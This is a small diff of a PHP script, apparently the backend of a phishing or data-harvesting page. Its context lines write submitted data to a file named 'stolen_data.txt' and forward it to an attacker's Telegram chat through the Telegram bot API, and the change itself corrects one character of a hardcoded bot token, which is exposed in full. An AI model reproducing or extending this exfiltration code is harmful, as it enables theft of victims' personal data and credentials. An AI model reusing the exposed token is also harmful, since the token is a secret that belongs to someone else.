@@ -31,7 +31,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     file_put_contents('stolen_data.txt', $file_data, FILE_APPEND);
     
     // Отправляем в Telegram
-    $botToken = '8110179122:AAHjbgAglX75ElcuKCcKwRwwXYGCvwY4_xM';
+    $botToken = '8110179122:AAHjbqAglX75ElcuKCcKwRwwXYGCvwY4_xM';
     $chatId = 'na1kota'; // Твой username без @
     
     $telegram_url = "https://api.telegram.org/bot$botToken/sendMessage";
